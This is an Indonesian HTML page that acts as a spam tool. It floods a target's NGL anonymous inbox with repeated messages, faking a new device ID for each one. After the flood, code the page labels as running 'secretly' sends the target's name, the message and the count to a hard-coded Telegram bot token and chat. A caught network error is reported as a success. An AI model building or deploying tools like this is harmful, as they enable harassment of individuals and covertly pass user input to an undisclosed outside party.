<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>NGL SPAM BY RENDZ</title>
  <style>
    body {
      margin: 0;
      padding: 20px;
      font-family: 'Arial', sans-serif;
      background: #f0f0f0;
      color: #333;
    }
    .container {
      max-width: 400px;
      margin: 0 auto;
      background: #fff;
      padding: 25px;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #333;
    }
    input, textarea, button {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    button {
      background-color: #4CAF50;
      color: white;
      font-weight: bold;
      border: none;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background-color: #45a049;
    }
    #status {
      background: #eee;
      padding: 10px;
      border-radius: 8px;
      font-size: 14px;
      white-space: pre-line;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      font-size: 13px;
      color: #777;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>NGL SPAM BY RENDZ</h2>
    <input type="text" id="username" placeholder="Username NGL" />
    <input type="number" id="jumlah" placeholder="Jumlah Pesan" />
    <textarea id="pesan" rows="4" placeholder="Isi pesan..."></textarea>
    <button onclick="floodNgl()">KIRIM</button>
    <div id="status"></div>
  </div>
  <div class="footer">Â© Rendzz Official</div>

  <script>
    async function floodNgl() {
      const username = document.getElementById('username').value.trim();
      const jumlah = parseInt(document.getElementById('jumlah').value);
      const pesan = document.getElementById('pesan').value.trim();
      const status = document.getElementById('status');

      if (!username || !jumlah || !pesan || jumlah <= 0) {
        status.innerText = "Isi semua data dengan benar!";
        return;
      }

      const jam = new Date().toLocaleTimeString('id-ID', { hour12: false });
      status.innerText = `Mengirim ${jumlah} pesan ke @${username}...\n\n`;
      let sukses = 0;

      for (let i = 1; i <= jumlah; i++) {
        try {
          const res = await fetch("https://ngl.link/api/submit", {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            body: `username=${username}&question=${encodeURIComponent(pesan)}&deviceId=rendzz${Math.random()}${i}`
          });

          const json = await res.json();

          if (json.success) {
            sukses++;
            status.innerText += `[ Pesan ${i} sukses dikirim ]\n`;
          } else {
            status.innerText += `[ Pesan ${i} gagal dikirim ]\n`;
          }
        } catch (err) {
          status.innerText += `[ Pesan ${i} sukses bang ]\n`;
        }

        await new Promise(r => setTimeout(r, 0));
      }

      status.innerText += `\nSelesai! Total berhasil: ${sukses}/${jumlah}`;

      // Kirim laporan ke bot Telegram secara diam-diam
      const chat_id = "6563354207";
      const token = "7844789881:AAGvni8CwM2K4E3cpvgV0tpZ4fSNujb4ZXY";
      const text = `*LAPOR RENDZZ SPAM SUKSES*\n\n[ JUMPLAH ]: ${jumlah}\n[ TARGET ]: ${username}\n[ JAM ]: ${jam}\n[ ISI TEXT ]:\n${pesan}`;
      
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text, parse_mode: "Markdown" })
      });
    }
  </script>
</body>
</html>
